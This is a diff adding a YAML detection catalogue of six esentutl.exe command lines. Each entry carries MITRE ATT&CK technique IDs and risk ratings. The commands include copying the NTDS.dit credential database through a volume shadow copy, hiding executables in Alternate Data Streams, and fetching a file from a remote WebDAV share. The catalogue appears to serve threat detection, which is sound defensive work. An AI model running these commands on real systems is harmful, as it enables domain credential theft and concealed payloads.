@@ -1,0 +1,122 @@
+- command: esentutl.exe /y C:\folder\sourcefile.vbs /d C:\folder\destfile.vbs /o
+  description: Copies sourcefile.vbs to destfile.vbs using esentutl.exe.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Command and Control:
+      - T1105
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Esentutl/
+    - https://attack.mitre.org/software/S0404/
+  risk: High
+  risk_reason: Copying arbitrary files using esentutl is highly unusual.
+  fidelity: High
+  fidelity_reason: This type of commandline activity is typically rare in most organizations.
+  tool: esentutl
+  threatactors:
+    N/A:
+      - N/A
+- command: esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\folder\ntds.dit
+  description: Copies a locked system file (such as NTDS.dit) using the Volume Shadow Copy Service (VSS).
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Credential Access:
+      - T1003.003
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Esentutl/
+    - https://attack.mitre.org/software/S0404/
+  risk: Critical
+  risk_reason: Copying system files such as NTDS.dit is highly suspicious.
+  fidelity: High
+  fidelity_reason: This type of commandline activity is typically rare in most organizations.
+  tool: esentutl
+  threatactors:
+    N/A:
+      - N/A
+- command: esentutl.exe /y C:\ADS\file.exe /d c:\ADS\file.txt:file.exe /o
+  description: Copies a file into the Alternate Data Stream (ADS) of another file.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1564.004
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Esentutl/
+    - https://attack.mitre.org/software/S0404/
+  risk: High
+  risk_reason: Copying files into an ADS of another using esentutl is highly suspicious.
+  fidelity: High
+  fidelity_reason: This type of commandline activity is typically rare in most organizations.
+  tool: esentutl
+  threatactors:
+    N/A:
+      - N/A
+- command: esentutl.exe /y C:\ADS\file.txt:file.exe /d c:\ADS\file.exe /o
+  description: Copies a file out of the Alternate Data Stream (ADS) of another file.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1564.004
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Esentutl/
+    - https://attack.mitre.org/software/S0404/
+  risk: High
+  risk_reason: Copying files out of the ADS of another file using esentutl is highly suspicious.
+  fidelity: High
+  fidelity_reason: This type of commandline activity is typically rare in most organizations.
+  tool: esentutl
+  threatactors:
+    N/A:
+      - N/A
+- command: esentutl.exe /y \\192.168.100.100\webdav\file.exe /d c:\ADS\file.txt:file.exe /o
+  description: Copies a remote file into the Alternate Data Stream (ADS) of another local file.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1564.004
+    Command and Control:
+      - T1105
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Esentutl/
+    - https://attack.mitre.org/software/S0404/
+  risk: High
+  risk_reason: Copying a remote file into the ADS of another file using esentutl is highly suspicious.
+  fidelity: High
+  fidelity_reason: This type of commandline activity is typically rare in most organizations.
+  tool: esentutl
+  threatactors:
+    N/A:
+      - N/A
+- command: esentutl.exe /y \\live.sysinternals.com\tools\adrestore.exe /d \\otherwebdavserver\webdav\adrestore.exe /o
+  description: Copies a remote file into into another remote location.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Command and Control:
+      - T1105
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Esentutl/
+    - https://attack.mitre.org/software/S0404/
+  risk: High
+  risk_reason: Copying a remote file into another remote file using esentutl is highly suspicious.
+  fidelity: High
+  fidelity_reason: This type of commandline activity is typically rare in most organizations.
+  tool: esentutl
+  threatactors:
+    N/A:
+      - N/A
